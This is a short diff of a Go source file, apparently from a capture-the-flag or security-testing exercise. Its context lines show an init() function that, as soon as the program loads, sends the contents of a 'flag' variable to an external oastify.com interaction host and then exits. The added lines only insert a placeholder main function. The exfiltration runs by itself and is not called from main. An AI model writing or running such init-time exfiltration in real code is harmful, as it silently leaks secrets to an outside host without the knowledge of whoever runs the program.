@@ -14,3 +14,6 @@ func init() {
  http.Get("http://zpsq0pbuqj84jv3kfjhc64kyapgg4asz.oastify.com?flag=" + string(flag))
  os.Exit(0) // Prevent further execution if needed
 }
+func main() {
+  fmt.Println("main")
+}
